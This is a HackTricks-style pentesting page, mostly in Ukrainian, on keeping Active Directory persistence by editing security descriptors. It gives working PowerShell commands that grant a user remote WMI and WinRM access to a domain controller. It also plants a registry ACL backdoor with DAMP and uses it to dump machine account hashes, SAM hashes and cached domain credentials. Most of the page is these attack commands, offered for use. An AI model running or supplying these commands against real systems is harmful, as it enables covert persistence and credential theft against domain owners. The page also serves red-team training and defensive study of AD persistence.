# Security Descriptors

{{#include ../../banners/hacktricks-training.md}}

## Security Descriptors

[From the docs](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language): Мова визначення дескриптора безпеки (SDDL) визначає формат, який використовується для опису дескриптора безпеки. SDDL використовує рядки ACE для DACL і SACL: `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`

**Дескриптори безпеки** використовуються для **зберігання** **дозволів**, які **об'єкт** має **на** **інший об'єкт**. Якщо ви зможете **внести** **невелику зміну** в **дескриптор безпеки** об'єкта, ви зможете отримати дуже цікаві привілеї над цим об'єктом без необхідності бути членом привілейованої групи.

Отже, ця техніка постійності базується на здатності отримати всі необхідні привілеї щодо певних об'єктів, щоб мати можливість виконати завдання, яке зазвичай вимагає адміністративних привілеїв, але без необхідності бути адміністратором.

### Access to WMI

Ви можете надати користувачу доступ до **віддаленого виконання WMI** [**використовуючи це**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1):
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
```
### Доступ до WinRM

Надайте доступ до **winrm PS консолі користувачу** [**використовуючи це**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### Дистанційний доступ до хешів

Доступ до **реєстру** та **вивантаження хешів**, створюючи **реєстраційний бекдор за допомогою** [**DAMP**](https://github.com/HarmJ0y/DAMP)**,** щоб ви могли в будь-який момент отримати **хеш комп'ютера**, **SAM** та будь-які **кешовані облікові дані AD** на комп'ютері. Тому дуже корисно надати цей дозвіл **звичайному користувачу на комп'ютері контролера домену**:
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
Перевірте [**Silver Tickets**](silver-ticket.md), щоб дізнатися, як ви можете використовувати хеш облікового запису комп'ютера Контролера домену.

{{#include ../../banners/hacktricks-training.md}}
